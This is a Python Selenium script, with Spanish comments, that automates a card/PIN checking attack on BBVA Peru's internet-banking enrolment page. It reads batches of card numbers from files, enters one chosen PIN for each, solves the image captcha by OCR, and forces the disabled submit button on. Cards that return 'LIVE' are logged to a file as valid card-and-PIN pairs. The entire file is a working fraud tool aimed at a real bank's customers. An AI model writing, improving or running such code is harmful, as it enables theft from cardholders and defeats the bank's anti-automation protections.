from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import NoSuchElementException
from os import system
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException

from selenium.common.exceptions import ElementClickInterceptedException, TimeoutException, ElementNotInteractableException
import time, os, argparse, undetected_chromedriver as uc, requests, threading, random, base64, sys

import pandas
from io import open
import pytesseract
import cv2
from PIL import Image
from colorama import init,Fore,Back,Style


class Responses(): 
    ban1 = 'Estimado cliente, no se pudo realizar su operación'

    maximosIntentos = 'Has superado el límite máximo de intentos para cambiar tu contraseña. Por favor, acércate a una oficina o comunícate al (01)595-0000.'
    grongCaptcha = 'El código de imagen ingresado es incorrecto.'
    
    live1 = 'Crea una nueva contraseña de acceso'
    live2 = 'El usuario no tiene acceso a BxI.'
    live3 = 'Ya estás afiliado a Banca por Interne'

    dead1 = 'Uno de los datos ingresados es incorrecto. Por favor, verifica e intenta nuevamente'
    dead2 = 'Verifique su Tipo de Tarjeta e intente nuevamente en unos instantes.'

    error1= 'Por favor actualiza o vuelve a ingresar desde'
    error2 = 'DESCRIPCION DEL ERROR NO ENCONTRADA PARA CANAL/IDIOMA'

def cambiarGray(IMANGEN):
    gray = cv2.cvtColor(IMANGEN,cv2.COLOR_BGR2GRAY)
    gray = cv2.blur(gray,(3,2)) # 3 y 2
    return gray

def cambiarCanny(IMANGEN):
    gray = cv2.cvtColor(IMANGEN,cv2.COLOR_BGR2GRAY)
    gray = cv2.blur(gray,(3,2)) # 3 y 2
    canny = cv2.Canny(gray,150,200)# 150 200
    return canny
def texFormt(p):
    tex = "f"
    #tex = pytesseract.image_to_string(cambiarCanny(p), config= '--psm 7 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz')
    tex = pytesseract.image_to_string(p, config= '--psm 7 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz')
    if tex == "":
        tex = pytesseract.image_to_string(p, config= '--psm 13 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz')

    return tex
    


def textoImagen(img_URL):

    IMANGEN = cv2.imread('./captchas/'+img_URL+'.png')

    #Recortar una imagenes
    imageOut1 = IMANGEN[1:60,0:34] # primera letra
    imageOut2 = IMANGEN[1:60,34:63] # 2da letra
    imageOut3 = IMANGEN[1:60,62:88] # 3e letra
    imageOut4 = IMANGEN[1:60,87:112] # 4 letra
    imageOut5 = IMANGEN[1:60,111:137] # 5 letra
    imageOut6 = IMANGEN[1:60,137:160] # 6 letra


    text1 = texFormt(p = imageOut1)
    text2 = texFormt(p = imageOut2)
    text3 = texFormt(p = imageOut3)
    text4 = texFormt(p = imageOut4)
    text5 = texFormt(p = imageOut5)
    text6 = texFormt(p = imageOut6)

    #cv2.imshow('Imagen de entrada',IMANGEN)
    #cv2.imshow('Imagen de salida1',imageOut1)
    #cv2.imshow('Imagen de salida2',imageOut2)
    #cv2.imshow('Imagen de salida3',imageOut3)
    #cv2.imshow('Imagen de salida4',imageOut4)
    #cv2.imshow('Imagen de salida5',imageOut5)
    #cv2.imshow('Imagen de salida6',imageOut6)

    #print("original: "+ text1.rstrip() +'|'+ text2.rstrip()+'|'+text3.rstrip()+'|'+text4.rstrip()+'|'+text5.rstrip()+'|'+text6.rstrip() )
    try:
        texto = text1.rstrip()[0] + text2.rstrip()[0]+text3.rstrip()[0]+text4.rstrip()[0]+text5.rstrip()[0]+text6.rstrip()[0]
    except Exception as e:
        texto = "ffffff"
    
    return texto.rstrip()

def screenshot_captcha(): 
    
    contador = 0
    contador = contador + 1
    time.sleep(0.1)
    imageName = [str(random.randint(0,9)) for x in range(45)]
    equis = "".join(imageName)
    imagenPEcapcha = './captchas/'+equis+'.png'

    waitLoadCaptcha = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, path_imgCaptcha)))
    #time.sleep(2)
    screenshot_captcha = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, path_imgCaptcha))).screenshot(imagenPEcapcha)
    
    texto = textoImagen(img_URL = equis)
    #os.system(f'del {imageName}')

    #decodeit = open(f'{imageName}.png', 'wb')
    #decodeit.write(base64.b64decode((photo)))
    #decodeit.close()
    return texto
 
      
            
        

        
def detected_responses(card, pin):
    while True:
        source = driver.page_source
        if Responses.maximosIntentos in source: return f'{card} PIN: {pin} : : Maximos intentos para la tarjeta DEATH .'
        elif Responses.dead2 in source: return f'{card} PIN: {pin} :  : Tarjeta erronea | DEATH :('
        elif Responses.dead1 in source: return f'{card} PIN: {pin} :  : Clave no encontrada :('
        elif Responses.grongCaptcha in source: return f'{card} PIN: {pin} :  : Captcha incorrecto.'
        elif Responses.error1 in source: return f'{card} PIN: {pin} :  : Error, recargar pagina.'
        elif Responses.live1 in source: return f'EXITOSO: --> {card} PIN: {pin} :  Mensaje: Clave Real Encontrada <3 LIVE'
        elif Responses.live2 in source: return f'EXITOSO: --> {card} PIN: {pin} :  Mensaje: Clave Real Encontrada <3 LIVE'
        elif Responses.live3 in source: return f'EXITOSO: --> {card} PIN: {pin} :  Mensaje: Clave Real Encontrada <3 LIVE'
        elif Responses.error2 in source: return f'EXITOSO: --> {card} PIN: {pin} :  Mensaje: DESCRIPCION DEL ERROR NO ENCONTRADA PARA CANAL/IDIOMA'
        #elif Errors.salioMalCargarWeb in source: return 'La web de BBVA no esta dando respuesta para recargar la web. Reintentando. E-001'      
        else: time.sleep(0.15)

pytesseract.pytesseract.tesseract_cmd = r"C:\Tesseract-OCR\tesseract.exe"
system('mode con: cols=90 lines=60')
init()
#url = "https://www.bbva.pe/personas/afiliacion.html"
url = "https://bancaporinternet.bbva.pe/bdpnux_pe_web_85/bdpnux_pe_web/aem/inscripcion/index"

#ids
id_cajero= "claveCajero"
id_tarje = "numeroTarjeta"
id_captcha = "codigoCaptcha"
id_btnSiguiente = "wizardNext"
id_mensajeError = "serverErrorMessages"
id_imagenCaptcha = "imgCaptcha"

#Paths
path_tarje = '//*[@id="numeroTarjeta"]' 
path_cajero = '//*[@id="codigoCaptcha"]'
path_btnSiguiente= '/html/body/div/div/div/div/div/div/form/article/div[3]/button[2]'
path_frame = '//*[@id="content-iframe"]'
#path_imgCaptcha = "/html/body/div/div/div/div/div/div/form/article/div[2]/div/div[1]/div/div[1]/div/div[4]/div/div/div/div/div/span[1]/img"
path_imgCaptcha = '//*[@id="imgCaptcha"]'
path_codeCaptcha = '//*[@id="codigoCaptcha"]'

os.system("cls")
print(Fore.GREEN)
print("   ──▄────▄▄▄▄▄▄▄────▄───")
print("   ─▀▀▄─▄█████████▄─▄▀▀──") 
print("   ─────██─▀███▀─██──────")
print("   ───▄─▀████▀████▀─▄────")
print("   ─▀█────██▀█▀██────█▀──\n\n")
print(Fore.CYAN)

lotetxt = input("Lote?: ")
textClave = input("clave?: ")

#Abriendo el navegador
#options = webdriver.ChromeOptions()
#options.add_experimental_option('excludeSwitches', ['enable-logging'])
#driver = webdriver.Chrome(options=options)
driver = webdriver.Firefox(executable_path = "geckodriver.exe")

driver.get(url)



flagFram1 = False

#textClave = "1234"
#lotetxt = 't1'
#lotetxt = input("Lote?: ")
#textClave = input("clave?: ")

with open ('./lotes/'+ str(lotetxt)+ '.txt') as texto:
    for x in texto:

        while True:
            print(Fore.CYAN)
            print("\n\n||||--------------------------------------------------------------------------------------------------------------------||||")
            tarjeta = x.rstrip()
            vacio = "0"
            
            if (flagFram1):
                WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH,path_frame)))
                driver.switch_to.frame(driver.find_element_by_xpath(path_frame))
                flagFram1 = False
            
           
            WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, path_tarje)))
            driver.execute_script(f'document.getElementById("numeroTarjeta").value ={tarjeta};')

            driver.execute_script(f'document.getElementById("claveCajero").type={vacio};')
            driver.execute_script(f'document.getElementById("claveCajero").value = "{textClave}";')

            #flagCaptcha = True
            while(True):
                #print("fotito")
                time.sleep(0.3)
                textCaptcha = screenshot_captcha()
                print(textCaptcha)
                textCaptcha = textCaptcha.rstrip()
                #driver.execute_script(f'document.getElementById("codigoCaptcha").value="{textCaptcha}";')
                driver.find_element(By.XPATH,path_codeCaptcha).clear()
                driver.find_element(By.XPATH,path_codeCaptcha).send_keys(textCaptcha)

                #click al boton siguiente:
                #WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH,"/html/body/div/div/div/div/div/div/form/article/div[3]/button[2]"))) # espera rboton sgite
                
                time.sleep(0.3)
                #driver.execute_script('document.getElementById("wizardNext")
                #print("click")

                driver.execute_script('document.getElementById("wizardNext").removeAttribute("disabled");')
                driver.execute_script('document.getElementById("wizardNext").click();')
                print(Fore.RED)
                response = detected_responses(card = tarjeta, pin = textClave)
                print(response)
                va2 = response.find('LIVE')
                va22 = response.find('CANAL/IDIOMA')
                if (va2 >= 0) or (va22 >=0 ):
                    print(Fore.GREEN)
                    print("Captcha encontrado")
                    print ('\a')
                    lives = open("lives.txt","a")
                    lives.write(tarjeta.rstrip()+ " ---> "+ textClave + " | 41266830") # escribir en el block
                    lives.write("\n")
                    lives.close()
                    #input()
                    driver.get(url)
                    time.sleep(3)
                    print(Fore.CYAN)
                    break

                va4 = response.find('Clave no encontrada')
                if va4 >= 0:
                    print("Captcha encontrado")
                    noEncontrado = open("noEncontrado.txt","a")
                    noEncontrado.write(tarjeta.rstrip()) # escribir en el block
                    noEncontrado.write("\n")
                    noEncontrado.close()
                    break

                va1 = response.find('DEATH')
                if va1 >= 0:
                    print("Captcha encontrado")
                    break
                elif (va1 <= 0):
                    print("Repitiendo captcha ------------->")
                    time.sleep(0.3)

                va3 = response.find('recargar pagina')
                if va3 >= 0:
                    #print("Captcha encontrado")
                    driver.get(url)
                    time.sleep(3)

                    break
                break
            break   


            
                
        

        #input()
        #||||---------------------------- Analizando el resultado ------------------------- ||||||||
        #time.sleep(2)
        
        

print("Fin Del Programa!!!")
print("Fin Del Programa!!!")
print("Fin Del Programa!!!")

input()
driver.close()
# No acabado

